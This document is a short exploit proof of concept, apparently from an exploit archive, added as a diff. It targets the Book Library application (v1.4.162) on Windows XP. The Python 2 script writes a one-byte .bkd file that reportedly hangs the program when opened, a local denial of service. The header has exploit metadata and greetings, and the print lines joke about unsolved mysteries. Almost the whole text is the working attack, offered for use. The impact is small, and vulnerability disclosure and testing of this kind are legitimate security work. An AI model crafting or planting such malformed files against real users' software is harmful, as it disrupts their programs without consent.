@@ -1,0 +1,28 @@
+# Exploit Title: Book Library Local Dos .bkd file
+# Date: April 14, 2010
+# Software Link: [http://wensoftware.com/]
+# Version: v1.4.162
+# Tested on: Windows XP SP3
+# Author: [anonymous]
+# Site: [www.setfreesecurity.com]
+# 
+# Click Open at top ->
+# Find your .bkd file
+# No Response about 5 sec
+#
+# Greetz Daddas, Exploit-DB crew
+#
+# I'ts hard to concentrate with echo's of your voice in my head.
+#
+#!/usr/bin/env python
+
+import time
+
+print "The Encyclopedia of Unsolved Mysteries\n"
+time.sleep(1)
+
+book=open('unsolved.bkd', 'w')
+book.write('\x00')
+book.close()
+
+print "UFO's, Atlantis, Nessie, Oh My!\n"
